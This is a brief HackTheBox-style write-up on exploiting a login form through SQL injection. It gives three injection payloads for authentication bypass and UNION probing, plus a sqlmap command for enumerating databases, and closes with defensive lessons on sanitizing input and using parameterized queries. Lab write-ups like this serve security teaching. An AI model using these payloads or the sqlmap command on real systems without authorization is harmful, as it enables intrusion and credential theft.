SQL Injection Mastery

📅 January 15, 2024⏱️ 12 min read🏠 HackTheBox

Overview

This writeup details the methodology used to exploit a SQL injection vulnerability in a web application, leading to authentication bypass and data extraction.

Enumeration

Initial enumeration revealed a login form that appeared to be vulnerable to SQL injection.

' OR '1'='1' --
' UNION SELECT NULL, NULL, NULL --
' UNION SELECT NULL, @@version, NULL --

Solution

Using sqlmap, we automated the extraction process and obtained admin credentials.

sqlmap -u "http://target.com/login" --data="username=admin&password=test" --dbs --batch

Lessons Learned

  • Always sanitize user inputs
  • Use parameterized queries
  • Implement proper error handling
  • Regular security testing is essential
